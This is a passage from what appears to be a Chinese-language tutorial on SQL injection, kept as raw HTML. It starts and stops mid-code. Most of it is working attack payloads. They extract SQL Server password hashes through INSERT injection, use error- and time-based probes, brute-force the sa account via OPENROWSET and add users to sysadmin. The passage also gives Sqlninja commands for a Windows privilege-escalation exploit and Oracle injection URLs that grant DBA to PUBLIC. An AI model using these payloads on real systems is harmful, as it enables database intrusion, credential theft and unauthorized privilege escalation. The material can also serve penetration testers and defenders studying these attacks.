keyword">type</span><span class="token comment">#&gt;0 and length(spare4)=62 </span>SYSS:<span class="token number">1336</span>FB26ACF58354164952E502B4F726FF8B5D382012D2E7B1EC99C426A7SYSTEMS:<span class="token number">38968</span>E8CEC12026112B0010BCBA3ECC2FD278AFA17AE363FDD74674F2651<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>高级用户，找到加密内容的表，都加密了一定会有可利用的</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">table</span> name<span class="token punctuation">,</span><span class="token keyword">column</span> name<span class="token punctuation">,</span>encryption_alg<span class="token punctuation">,</span>salt <span class="token keyword">from</span> dba_encrypted_columns<span class="token punctuation">;</span> <span class="token keyword">TABLE</span> NAME       <span class="token keyword">COLUMN</span> NAME    ENCRYPTION ALG       SALT CREDITCARDCCNR          AES256              <span class="token keyword">NO</span>CREDITCARD  CVE           AES256              <span class="token keyword">NO</span>CREDITCARD        VALID          AES256              <span class="token keyword">NO</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>检索数据库存在哪些DBA账户</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> grantee<span class="token punctuation">,</span>granted_role<span class="token punctuation">,</span>admin_option<span class="token punctuation">,</span>default_role <span class="token keyword">from</span> dba_role_privs <span class="token keyword">where</span> granted_role<span class="token operator">=</span><span class="token string">'DBA'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="在INSERT查询中实施注入攻击"><a href="#在INSERT查询中实施注入攻击" class="headerlink" title="在INSERT查询中实施注入攻击"></a>在INSERT查询中实施注入攻击</h3><p>更新数据后执行注入查询语句，update，delete一个意思</p><h4 id="第一种情形：插入用户规定的数据"><a href="#第一种情形：插入用户规定的数据" class="headerlink" title="第一种情形：插入用户规定的数据"></a>第一种情形：插入用户规定的数据</h4><h5 id="插入的不是最后一列"><a href="#插入的不是最后一列" class="headerlink" title="插入的不是最后一列"></a>插入的不是最后一列</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 插入模板</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'sql'</span><span class="token punctuation">,</span><span class="token string">'notsql'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>插入第一列，构造SQL代码关闭<code>sql</code>，再构建我们需要查询的第二列，注释掉其他部分</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'sql'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">1</span> name <span class="token operator">+</span> <span class="token string">' | '</span> <span class="token operator">+</span> master<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>password_hash<span class="token punctuation">)</span> <span class="token keyword">from</span> sys<span class="token punctuation">.</span>sql_logins<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- ','notsql')</span><span class="token comment">-- fn_varbintohexstr将二进制的哈希值转换为十六进制格式</span><span class="token comment">-- http://test/?sql=sql',(SELECT TOP 1 name + ' | ' + master.sys.fn_varbintohexstr(password_hash) from sys.sql_logins))-- &amp;notsql=notsql</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="插入的是最后一列"><a href="#插入的是最后一列" class="headerlink" title="插入的是最后一列"></a>插入的是最后一列</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 插入模板</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span> col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'notsql'</span><span class="token punctuation">,</span><span class="token string">'sql'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在mysql中只有处于ANSI模式(或者任何实现了 PIPES_AS_QUOTES的其他模式，比如DB2、ORACLE或MAXDB)，管道符才会被解析成连接符。然而，一般都是未实现PIPES_AS_QUOTES(比如处于TRADITIONAL模式)，那么||操作符将被解析为一个OR逻辑操作符，而不是一个连接操作符。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token string">'bar'</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">select</span> @<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> CONCAT<span class="token punctuation">(</span><span class="token string">'bar'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> @@ version<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用整数与字符相加，优先显示数字的特性</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token string">'d'</span> <span class="token operator">+</span><span class="token comment">/**/</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token comment">/**/</span>@<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示@@version的第一个字符，/**/绕过空格</p><p>转化非整数字符使用ASCII()</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>co12<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token string">'bar'</span><span class="token operator">+</span><span class="token comment">/**/</span>ascii<span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token operator">+</span><span class="token comment">/**/</span>ascii<span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token punctuation">(</span>col1<span class="token punctuation">,</span>col2<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token operator">+</span><span class="token comment">/**/</span>ascii<span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="第二种情形：生成INSERT错误"><a href="#第二种情形：生成INSERT错误" class="headerlink" title="第二种情形：生成INSERT错误"></a>第二种情形：生成INSERT错误</h4><p>为了不污染原数据表，执行子查询，使insert失败，返回错误中得到信息</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> users <span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>foo'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">1</span> name <span class="token keyword">from</span> users <span class="token keyword">where</span> age<span class="token operator">=</span>@<span class="token variable">@version</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>先执行子查询，由于@@version不是数字，报错，不执行insert</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> columnl <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token number">1</span> <span class="token keyword">WHERE</span> column1 <span class="token operator">=</span> <span class="token string">'test'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>标量子查询就是只返回单列值而不是多列值或多行的子查询，如果子查询返回一个值或者NULL，外部将执行，返回超过一行就会终止外部查询展示错误信息，所以可以插入两个select</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> @<span class="token variable">@version</span> <span class="token operator">LIKE</span> <span class="token string">'5.1.56%'</span> <span class="token keyword">THEN</span> SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token string">'somevalue'</span> <span class="token keyword">END</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'valuel'</span> <span class="token keyword">AS</span> foobar<span class="token punctuation">)</span> <span class="token keyword">UNION</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'value2'</span> <span class="token keyword">AS</span> foobar<span class="token punctuation">)</span><span class="token punctuation">)</span> ALIAS<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>CASE子句检查提取的MySQL版本信息，如果遇到特定的版本，SLEEP命令将执行以延迟5秒的时间。这可以告诉我们MySQL是否是某个特定的版本，同时UNION命令将确保向外部SELECT返回两行数据，从而产生错误。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 插入模板</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token number">1</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'injectable_parameter'</span><span class="token punctuation">)</span><span class="token comment">-- 注入参数</span><span class="token string">'|| SELECT (SELECT CASE WHEN @@version LIKE '</span><span class="token number">5.1</span><span class="token number">.56</span><span class="token operator">%</span><span class="token string">' THEN SLEEP(5) ELSE '</span>somevalue<span class="token string">' END FROM ((SELECT '</span>valuel<span class="token string">' AS foobar) UNION (SELECT '</span>value2<span class="token string">' AS foobar)) ALIAS) ||'</span><span class="token comment">-- 拼接后</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token keyword">table</span> <span class="token number">1</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">||</span> <span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> @<span class="token variable">@version</span> <span class="token operator">LIKE</span> <span class="token string">'5.1.56%'</span> <span class="token keyword">THEN</span> SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token string">'somevalue'</span> <span class="token keyword">END</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'valuel'</span> <span class="token keyword">AS</span> foobar<span class="token punctuation">)</span> <span class="token keyword">UNION</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'value2'</span> <span class="token keyword">AS</span> foobar<span class="token punctuation">)</span><span class="token punctuation">)</span> ALIAS<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>REGEXP操作符</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'a'</span> <span class="token operator">REGEXP</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token operator">&lt;</span>condition<span class="token operator">&gt;</span> <span class="token keyword">THEN</span> <span class="token string">'.*'</span> <span class="token keyword">ELSE</span> <span class="token string">'*'</span> <span class="token keyword">END</span> <span class="token punctuation">(</span><span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'fool'</span> <span class="token keyword">AS</span> bar<span class="token punctuation">)</span> <span class="token keyword">UNION</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'foo2'</span> <span class="token keyword">AS</span> bar<span class="token punctuation">)</span> foobar<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果条件(condition)为true, CASE子句将使用有效的正则表达式它将向最外层的 SELECT语句返回两行数据，我们将接收到常见的错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ERROR <span class="token number">1242</span> <span class="token punctuation">(</span><span class="token number">21000</span><span class="token punctuation">)</span>: Subquery returns <span class="token function">more</span> than <span class="token number">1</span> row<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果条件为false, REGEXP将采用作为参数，它并不是一个有效的正则表达式， 在这种情况下数据库服务器将返回下列错误：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ERROR <span class="token number">1139</span> <span class="token punctuation">(</span><span class="token number">42000</span><span class="token punctuation">)</span> <span class="token builtin class-name">:</span> Got error <span class="token string">'repetition-operator operand invalid'</span> from regexp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?name=';INSERT+INTO+users(id,pass,privs)+VALUES+('test','test',0)-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h3><p>由于对普通用户存在着限制，要想充分发挥前面介绍的几种攻击的潜力，就必须获取管理员访问权。</p><h4 id="SQL-Server-1"><a href="#SQL-Server-1" class="headerlink" title="SQL Server"></a>SQL Server</h4><p><code>OPENROWSET</code>作用于SQL Server上，实现对远程OLE DB数据源(例如另一个SQL Server数据库)的一次性连接。DBA可用它来检索远程数据库上的数据，以此作为永久连接(link)两个数 据库的一种手段。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN; Address=10.0.2.2;uid=foo;pwd=password'</span><span class="token punctuation">,</span><span class="token string">'SELECT columnl FROM tableA'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上述语句中以用户foo连接到地址为10.0.2.2的SQL Server并执行<code>select column1 from tableA</code>查询，最外层的查询传递并返回该查询的结果。foo是地址为10.0.2.2的数据库的一个用户，而不是首次执行OPENROWSET时的数据库用户。</p><p>openrowset可以用来爆破sa提权，有三个要点</p><ul><li><p>OPENROWSET必须提供执行连接的数据库上的有效凭证。</p></li><li><p>OPENROWSET不仅可用于连接远程数据库，还可用于执行本地连接；执行本地连接时，使用用户在OPENROWSET调用中指定的权限。</p></li><li><p>在SQL Server 2000上，所有用户均可调用OPENROWSET;而在SQL Server 2005和 2008上，默认情况下该操作被禁用。但有时会被DBA重新启用</p></li><li><p>openrowset至少返回一行，所以加个在没有其他会显示是，必须加个<code>select 1</code>，当然也能加其他的</p></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 爆破sa口令</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;Address=;uid=sa; pwd=foo'</span><span class="token punctuation">,</span><span class="token string">'select 1'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>foo是口令的话返回1，不正确返回<code>Login failed for user 'sa'.</code></p><p>如果找到了sa口令，可以使用<code>sp_addsrvrolemember</code>储存过程将用户添加至sysadmin组，这样就能提升权限</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;Address=;uid=sa;pwd=password'</span><span class="token punctuation">,</span><span class="token string">'SELECT 1; EXECmaster.dbo.sp_addsrvrolemeniber "appdbuser","sysadmin"'</span><span class="token punctuation">)</span><span class="token comment">-- 两个参数appdbuser是用户名，第二个是组名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>注入一个完整的过程，首先构造一个包含OPENROWSET查询和正确用户名的字符串@q，然后通过将@q传递给xp execresultset扩展存储过程（在SQL Server 2000上，所有用户均可调用它）来执行该查询。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@q</span> nvarchar<span class="token punctuation">(</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SET</span> <span class="token variable">@q</span> <span class="token operator">=</span> N<span class="token string">'SELECT 1 FROM OPENROWSET（"SQLOLEDB","Network=DBMSSOCN; Address=;uid=sa;pwd=password","SELECT 1; EXEC master.dbo.sp_addsrvrolemember '</span>"<span class="token string">"+system_user+""',""sysadmin"</span>"<span class="token punctuation">)</span><span class="token string">';EXEC master.dbo.xp_execresultset @q, N'</span>master'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有目标SQL server启用了混合验证模式，sa才能工作，使用混合验证模式时，Windows用户和SQL Server用户（比如sa）均可通过数据库验证。如果远程数据库服务器上配置的只有Windows验证模式，那么此时只有Windows用户能够访问数据库，sa账户将不可用。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 检测当前使用的哪种模式</span><span class="token keyword">select</span> serverproperty<span class="token punctuation">(</span><span class="token string">'IslntegratedSecurityOnly'</span><span class="token punctuation">)</span><span class="token comment">-- 如果当前采用的只有Windows验证模式，那么该查询返回1，否则返回0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Sqlninja暴力破解命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./sqlninj a <span class="token parameter variable">-m</span> bruteforce <span class="token parameter variable">-w</span> wordlist.txt./sqlninj a <span class="token parameter variable">-m</span> fingerprint<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>OPENROWSET 还可用于寻找存在弱口令的SQL Server</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;Address=10.0.0.1;uid=sa; pwd='</span><span class="token punctuation">,</span><span class="token string">'SELECT 1'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 测试openrowset是否可用</span><span class="token keyword">select</span> value_in_use <span class="token keyword">from</span> sys<span class="token punctuation">.</span>configurations <span class="token keyword">where</span> name <span class="token operator">LIKE</span> <span class="token string">'Ad Hoc%'</span> <span class="token comment">-- 如果OPENROWSET可用，该查询将返回1，否则将返回0。 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="在未打补丁的服务器上提升权限"><a href="#在未打补丁的服务器上提升权限" class="headerlink" title="在未打补丁的服务器上提升权限"></a>在未打补丁的服务器上提升权限</h4><p>如果目标数据库服务器没有更新最新的安全补丁，它就可能会受到一种或多种很有名的攻击。</p><p>例子：CVE-2010-0232漏洞</p><p>Sqlninja中包含了一个利用该原始漏洞的定制版本的工具。当以sql作为参数来调用该工具时， 它将寻找SQLSERVR.EXE进程并将该进程的权限提升为SYSTEM。为了执行这种攻击，需要 执行下面几个步骤：</p><ul><li><p>使用 fingerprint 模式(-m fingerprint)检查 xp cmdshell 是否可用(option 3),以及 SQLSERVR. EXE并未以SYSTEM权限运行(option 5)。</p></li><li><p>使用 upload 模式(-m upload)将 vdmallowed.exe(option 5)和 vdmexploit.dll(叩tion 6)传送到远程服务器。</p></li><li><p>使用 command 模式(-m command)运行 ‘<code>％TEMP%\\vdmallowed.exe sql</code>， 以执行该漏洞利用工具。</p></li></ul><p>如果远程Windows服务器没有打上针对这一漏洞的补丁，此时fingerprint模式将确认SQL Server真正运行在SYSTEM权限之下。</p><h5 id="Oracle-1"><a href="#Oracle-1" class="headerlink" title="Oracle"></a>Oracle</h5><p>如果我们可以访问<code>dbms_xmlquery.newcontext()</code>或<code>dbms_xmlquery.getxml()</code>(默认对于PUBLIC权限可访问)，就可以通过匿名PL/SQL代码块执行注入</p><p>不需要PL/SQL注入的一个例子是：使用在Oracle的mod_plsql组件中发现的一个漏洞。 下列URL展示了一种通过driload包提升权限的方法。这个包未被mod_plsql组件过滤，所有Web用户均可通过输入下列URL来提升权限：</p><p><a href="http://www.victim.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=GRANT+DBA+TO+PUBLIC">http://www.victim.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=GRANT+DBA+TO+PUBLIC</a></p><p>在利用大多数权限提升漏洞时使用了下列概念：</p><ol><li>创建一个将DBA权限授权给公共角色的有效载荷。这比将DBA权限授权给指定的用户更隐蔽些。下一步将把该有效载荷注入一个易受攻击的PL/SQL存储过程中。</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> F1 <span class="token keyword">return</span> numberauthid <span class="token keyword">current_user</span> <span class="token keyword">as</span>pragma autonomous_transaction<span class="token punctuation">;</span><span class="token keyword">BEGIN</span><span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token string">'GRANT DBA TO PUBLIC'</span>；<span class="token keyword">COMMIT</span><span class="token punctuation">;</span><span class="token keyword">RETURN</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>将该有效载荷注入一个易受攻击的包中：</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sys<span class="token punctuation">.</span>kupw$WORKER<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'YY'' and 1=user12.f1 -- mytagl2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>启用DBA角色：</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> role DBA<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>从公共角色中撤销DBA角色：</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">revoke</span> DBA <span class="token keyword">from</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当前会话虽然仍然拥有DBA权限，但却不再出现在Oracle的权限表中。</p><h5 id="SYS-LT"><a href="#SYS-LT" class="headerlink" title="SYS.LT"></a>SYS.LT</h5><p>如果数据库用户具有CREATE PROCEDURE权限，我们就可以在该用户的模式(schema) 中创建一个恶意函数，并在SYS.LT包的一个容易遭受攻击的对象中注入该函数(2009年4月 Oracle已经修正了这一问题)。这一攻击的结果，就是我们的恶意函数在SYS许可权限下获得 执行，并且我们获得了 DBA权限。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建函数</span>http:<span class="token comment">//www.victim.com/inciex.jsp?id=1 and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate "create or replace function pwn2 return varchar2 authid current_user is PRAGMA autonomous_transaction;BEGIN execute immediate ""grant dba to public"";commit;return "",1"";END;''; commit; end;') from dual) is not null -- </span><span class="token comment">-- 利用 SYS.LT</span>http:<span class="token comment">//www.victim.com/index.jsp?id=l and (select dbms_xmlquery. newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate "begin SYS.LT.CREATEWORKSPACE(""A10""""" and scott.pwn2()=""""x"");SYS.LT.REMOVEWORKSPACE(""A10"""" and scott.pwn2()=""""x"");end;";commit;end;') from dual) is not null -- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SYS-DBMS-CDC-PUBLISH"><a href="#SYS-DBMS-CDC-PUBLISH" class="headerlink" title="SYS.DBMS_CDC_PUBLISH"></a>SYS.DBMS_CDC_PUBLISH</h4><p>该问题在sys.dbms_cdc_publish.create_change_set包中，该漏洞允许一个具有execute catalog role权限的用户成为DBA</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.dbms_cdc_publish.create_change_set(''''a'''',''''a'''',''''a''''''''||SCOTT.pwn2()||''''''''a'''',''''Y'''',sysdate,sysdate);end;'';commit; end;') from dual) is not null--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="绕过-CREATE-PROCEDURE-权限"><a href="#绕过-CREATE-PROCEDURE-权限" class="headerlink" title="绕过 CREATE PROCEDURE 权限"></a>绕过 CREATE PROCEDURE 权限</h5><p>要求具有create procedure权限</p><h5 id="cursor注入"><a href="#cursor注入" class="headerlink" title="cursor注入"></a>cursor注入</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/index.jsp?id=l and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' DECLARE D NUMBER;BEGIN D:= DBMS_SQL.OPEN_CURSOR; DBMS_SQL.PARSE(D,''''declare pragma autonomous_transaction; begin execute immediate ''''''''' grant dba to public'''''''';commit;end;'''',0);SYS.LT.CREATEWORKSPACE(''''a''''''' and 